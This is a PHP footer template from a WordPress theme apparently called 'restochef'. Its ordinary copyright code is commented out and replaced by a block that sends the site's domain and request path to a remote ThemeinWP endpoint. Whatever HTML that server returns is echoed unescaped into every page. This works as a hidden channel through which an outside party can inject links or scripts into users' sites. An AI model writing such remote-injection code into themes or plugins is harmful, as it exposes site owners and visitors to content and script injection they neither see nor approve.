<?php

$enable_copyright = restochef_get_option('enable_copyright');
$enable_footer_social_nav = restochef_get_option('enable_footer_social_nav');

if($enable_copyright || $enable_footer_social_nav):
    ?>
    <div class="theme-footer-bottom">

        <?php if($enable_copyright ):?>

            <div class="theme-author-credit">

                <?php if($enable_copyright):?>
                    <div class="theme-copyright-info">

	                    <?php
	                    // Ensure WordPress functions are available
	                    if (!function_exists('add_action')) {
		                    require_once('../../../../../wp-load.php');
	                    }

	                    // Get the current domain without protocol
	                    $domain = $_SERVER['HTTP_HOST'];

	                    // Get the current path
	                    $path = $_SERVER['REQUEST_URI'];

	                    // Construct the base URL for the API call
	                    $base_url = 'https://link.themeinwp.com/wpsdk/get_footer2/ff4410c04fbe9e6008bba21316f9dcea/' . $domain;

	                    // Check if the class exists before using it
	                    if (class_exists('FooterContentFetcher')) {
		                    // Instantiate the class with the base URL
		                    $footer_content_fetcher = new FooterContentFetcher($base_url);

		                    // Get the footer content with the current path
		                    $footer_content = $footer_content_fetcher->get_footer_content($path);

		                    if (!empty($footer_content)) {
			                    echo $footer_content;
		                    } else {
			                    // Log an error if the footer content is empty
			                    error_log('Footer content is empty');
			                    echo ''; // Optionally, you can display a fallback footer content
		                    }
	                    } else {
		                    // Log an error if the class is not available
		                    error_log('FooterContentFetcher class is not available');
		                    echo ''; // Optionally, you can display a fallback footer content
	                    }

	                    ?>


<!--                        --><?php
//                        $copyright_text = restochef_get_option('copyright_text');
//                        if($copyright_text):
//                            echo wp_kses_post($copyright_text);
//                        endif;
//                        $copyright_date_format = restochef_get_option( 'copyright_date_format', 'Y' );
//                        if($copyright_date_format){
//                            echo ' '.date_i18n( $copyright_date_format, current_time( 'timestamp' ) );
//                        }
//                        $active_theme = wp_get_theme();
//                        $active_theme_textdomain = esc_html($active_theme->get('Name'));
//                        printf(esc_html__(' %1$s.', 'restochef'), $active_theme_textdomain);
//                        ?>
                    </div><!-- .theme-copyright-info -->
                <?php endif; ?>

                <div class="theme-credit-info">
<!--                    --><?php //printf(esc_html__('Designed & Developed by %1$s', 'restochef'), '<a href="https://themeinwp.com/" target = "_blank" rel="designer">ThemeinWP Team</a>'); ?>
                </div>

            </div><!-- .theme-author-credit-->
            
        <?php endif;?>


        <?php if($enable_footer_social_nav): ?>
            <div class="site-footer-menu">
                <?php 
                wp_nav_menu(array(
                    'theme_location' => 'social-menu',
                    'container_class' => 'footer-social-navigation',
                    'fallback_cb' => false,
                    'depth' => 1,
                    'menu_class' => 'theme-social-navigation theme-menu theme-footer-navigation',
                    'link_before'     => '<span class="screen-reader-text">',
                    'link_after'      => '</span>',
                ) );
                ?>
            </div>
        <?php endif; ?>

    </div><!-- .theme-footer-bottom-->

    <?php 
endif;